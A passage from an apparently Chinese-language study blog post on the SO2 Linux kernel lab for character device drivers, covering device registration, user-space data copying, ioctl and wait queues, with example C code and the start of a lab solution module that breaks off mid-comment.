<li><code>file</code> 的属性是 <code>inode</code>，文件名，文件打开属性，文件位置</li>
<li>所有打开的文件都有与之关联的 <code>file</code> 结构体</li>
</ul>
<p>回到设备驱动程序，有两个实体几乎总是具有标准的使用方式：</p>
<ul>
<li><code>inode</code>：更用于确定执行操作的设备的 major and minor</li>
<li><code>file</code>：用于确定打开文件的标志，还用于保存和访问（以后）私有数据</li>
</ul>
<p><strong>Registration and unregistration of character devices</strong></p>
<p>设备的注册/注销是通过指定 major and minor 设备来实现的</p>
<ul>
<li>类型 <code>dev_t</code> 用于保留设备的标识符（major and minor），并且可以使用 MKDEV 宏获取</li>
</ul>
<p>对于设备标识符的静态分配和静态注销：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> first, <span class="keyword">unsigned</span> <span class="keyword">int</span> count, <span class="keyword">char</span> *name)</span></span>; <span class="comment">/* 创建一个字符设备区 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unregister_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> first, <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>; <span class="comment">/* 删除一个字符设备区 */</span></span><br></pre></td></tr></table></figure>
<p>分配标识符后，必须初始化字符设备并且必须通知内核，然后才能注册/删除字符设备：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_init</span><span class="params">(struct cdev *cdev, struct file_operations *fops)</span></span>; <span class="comment">/* 初始化字符设备,并通知内核 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cdev_add</span><span class="params">(struct cdev *dev, <span class="keyword">dev_t</span> num, <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>; <span class="comment">/* 注册字符设备 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_del</span><span class="params">(struct cdev *dev)</span></span>; <span class="comment">/* 删除字符设备 */</span></span><br></pre></td></tr></table></figure>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAJOR       42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAX_MINORS  5</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">    <span class="comment">/* my data starts here */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> <span class="title">devs</span>[<span class="title">MY_MAX_MINORS</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open = my_open,</span><br><span class="line">    .read = my_read,</span><br><span class="line">    .write = my_write,</span><br><span class="line">    .release = my_release,</span><br><span class="line">    .unlocked_ioctl = my_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, err;</span><br><span class="line">    err = register_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>), MY_MAX_MINORS,</span><br><span class="line">                                 <span class="string">&quot;my_device_driver&quot;</span>); <span class="comment">/* MKDEV获取设备标识符 */</span></span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MY_MAX_MINORS; i++) &#123;</span><br><span class="line">        cdev_init(&amp;devs[i].cdev, &amp;my_fops); <span class="comment">/* 绑定自己设置的file_operations */</span></span><br><span class="line">        cdev_add(&amp;devs[i].cdev, MKDEV(MY_MAJOR, i), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MY_MAX_MINORS; i++) &#123;</span><br><span class="line">        <span class="comment">/* release devs[i] fields */</span></span><br><span class="line">        cdev_del(&amp;devs[i].cdev);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(MKDEV(MY_MAJOR, <span class="number">0</span>), MY_MAX_MINORS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同一个 <code>dev_t</code> 可以注册多个字符设备，每次 <code>open(DEVICE_PATH, O_RDONLY)</code> 时，本质上是和一个具体的字符设备进行交互（使用 <code>struct cdev</code> 父类结构体中的数据）</p>
<p>因此，如果两个进程访问同一个字符设备，就很可能在临界区引发安全问题，所以我们要在字符设备的 <code>open</code> 上加锁，禁止其被二次打开</p>
<p>为了程序的并发性，通常我们需要为同一个 <code>dev_t</code> 注册多个字符设备，在进程 <code>open</code> 提供不同的字符设备供其使用</p>
<p><strong>Access to the address space of the process</strong></p>
<p>设备的驱动程序是应用程序和硬件之间的接口，因此，我们经常必须访问用户空间数据（但不能以取消引用用户空间指针的方式，来直接访问用户空间）</p>
<p>直接访问用户空间指针可能会导致：</p>
<ul>
<li>不正确的行为（根据体系结构的不同，用户空间指针可能无效或映射到内核空间）</li>
<li>内核 oops（用户模式指针可以引用非驻留内存区域）</li>
<li>安全问题</li>
</ul>
<p>因此通过调用下面的宏函数来正确访问用户空间数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">put_user(type val, type *address);</span><br><span class="line">get_user(type val, type *address);</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_to_user</span><span class="params">(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">copy_from_user</span><span class="params">(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br></pre></td></tr></table></figure>
<p>下图说明了 Read 操作以及如何在用户空间和驱动程序之间传输数据：</p>
<img src="/2022/10/13/Linux-Lab3-Character%20device%20drivers/1665576468222.png" class width="1665576468222"> 
<ul>
<li>当驱动 driver 有足够多的可用数据时，它将准确地将所需 size 的数据传输给用户</li>
<li>当驱动 driver 没有足够多的可用数据时，它将把所有的可用数据传输给用户</li>
</ul>
<p>Read 操作的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_read</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> (struct my_device_data *) file-&gt;private_data;</span><br><span class="line">    <span class="keyword">ssize_t</span> len = min(my_data-&gt;size - *offset, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data from my_data-&gt;buffer to user buffer */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(user_buffer, my_data-&gt;buffer + *offset, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    *offset += len;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下图说明了 Write 操作以及如何在用户空间和驱动程序之间传输数据：</p>
<img src="/2022/10/13/Linux-Lab3-Character%20device%20drivers/1665577257857.png" class width="1665577257857"> 
<ul>
<li>写入操作将响应来自用户空间的写入请求，其范围不会大于最大驱动程序容量 MAXSIZ</li>
</ul>
<p>Write 操作的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> * offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> (struct my_device_data *) file-&gt;private_data;</span><br><span class="line">    <span class="keyword">ssize_t</span> len = min(my_data-&gt;size - *offset, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read data from user buffer to my_data-&gt;buffer */</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(my_data-&gt;buffer + *offset, user_buffer, len))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    *offset += len;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Ioctl</strong></p>
<p>除了 Read 和 Write 操作之外，驱动程序还需要能够执行某些物理设备控制任务（这些操作是通过实现函数来完成的）</p>
<p>可用通过如下函数完成此操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">my_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>file</code>：打开的设备文件描述符</li>
<li><code>cmd</code>：从用户空间发送的命令</li>
<li><code>arg</code>：指向用户空间的指针，使用 <code>copy_from_user</code> 来安全地获取其值</li>
</ul>
<p>在实现该功能之前，必须选择与命令对应的数字（建议使用宏定义 <code>_IOC(dir, type, nr, size)</code> 来完成此操作），然后在一个 Switch-Case 中完成各个命令</p>
<p>使用案例如下：（在用户空间调用 <code>ioctl</code>，对应到内核就是 <code>my_ioctl</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_IOCTL_IN _IOC(_IOC_WRITE, <span class="meta-string">&#x27;k&#x27;</span>, 1, sizeof(my_ioctl_data))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">my_ioctl</span> <span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span></span><br><span class="line">         (struct my_device_data*) file-&gt;private_data;</span><br><span class="line">    my_ioctl_data mid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> MY_IOCTL_IN:</span><br><span class="line">        <span class="keyword">if</span>( copy_from_user(&amp;mid, (my_ioctl_data *) arg,</span><br><span class="line">                           <span class="keyword">sizeof</span>(my_ioctl_data)) )</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* process data and execute command */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Waiting queues</strong></p>
<p>等待队列是正在等待特定事件的进程的列表，使用 <code>wait_queue_head_t</code> 类型定义，可由函数/宏使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DECLARE_WAIT_QUEUE_HEAD(wq_name); <span class="comment">/* 在编译时初始化队列 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_waitqueue_head</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q)</span></span>; <span class="comment">/* 初始化队列 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition)</span></span>; <span class="comment">/* 在条件为false时将当前线程添加到队列中,将其设置为TASK_UNINTERRUPTIBLE,并调度新线程 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event_interruptible</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition)</span></span>; <span class="comment">/* 在条件为false时将当前线程添加到队列中,将其设置为TASK_INTERRUPTIBLE,并调度新线程 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event_timeout</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition, <span class="keyword">int</span> timeout)</span></span>; <span class="comment">/* 和wait_event一样,只是timeout耗尽时同样会退出 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wait_event_interruptible_timeout</span><span class="params">(<span class="keyword">wait_queue_head_t</span> q, <span class="keyword">int</span> condition, <span class="keyword">int</span> timeout)</span></span>; <span class="comment">/* 和wait_event_interruptible一样,只是timeout耗尽时同样会退出 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q)</span></span>; <span class="comment">/* 从目标等待队列中唤醒一个进程 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up_interruptible</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q)</span></span>; <span class="comment">/* 仅唤醒状态为TASK_INTERRUPTIBLE的线程 */</span></span><br></pre></td></tr></table></figure>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=device_drivers make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>直接看最终代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Character device drivers lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * All tasks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;../include/so2_cdev.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;SO2 character device&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_LEVEL	KERN_INFO</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MAJOR		42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_MINOR		0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_MINORS		1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE_NAME		<span class="meta-string">&quot;so2_cdev&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MESSAGE			<span class="meta-string">&quot;hello\n&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_MESSAGE		<span class="meta-string">&quot;Hello ioctl&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> BUFSIZ</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZ		4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> &#123;</span></span><br><span class="line">	<span class="comment">/* TODO 2: add cdev member */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 4: add buffer with BUFSIZ elements */</span></span><br><span class="line">	<span class="keyword">char</span> buffer[BUFSIZ];</span><br><span class="line">	<span class="comment">/* TODO 7: extra members for home */</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> <span class="built_in">queue</span>;</span><br><span class="line">	<span class="comment">/* TODO 3: add atomic_t access variable to keep track if file is opened */</span></span><br><span class="line">	<span class="keyword">atomic_t</span> access;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> <span class="title">devs</span>[<span class="title">NUM_MINORS</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">so2_cdev_open</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">so2_device_data</span> *<span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: print message when the device file is open. */</span></span><br><span class="line">	printk(<span class="string">&quot;message:%s&quot;</span>,MESSAGE);</span><br><span class="line">	<span class="comment">/* TODO 3: inode-&gt;i_cdev contains our cdev struct, use container_of to obtain a pointer to so2_device_data */</span></span><br><span class="line">	data = container_of(inode-&gt;i_cdev, struct so2_device_data, cdev);</span><br><span class="line">	file-&gt;private_data = data;</span><br><span class="line">	<span class="comment">/* TODO 3: return immediately if access is = 0, use atomic_cmpxchg */</span></span><br><span class="line">    <span class="comment">/* 这里我的想法和原实验不一样:</span></span><br><span class="line"><span class="comment">    设置已经open的字符设备的&quot;data-&gt;access&quot;为&#x27;1&#x27;,</span></span><br><span class="line"><span class="comment">    设置没有open的字符设备的&quot;data-&gt;access&quot;为&#x27;0&#x27;,</span></span><br><span class="line"><span class="comment">    初始化时,所有的&quot;data-&gt;access&quot;都为&#x27;0&#x27;,表明所有字符设备都没有open过</span></span><br><span class="line"><span class="comment">    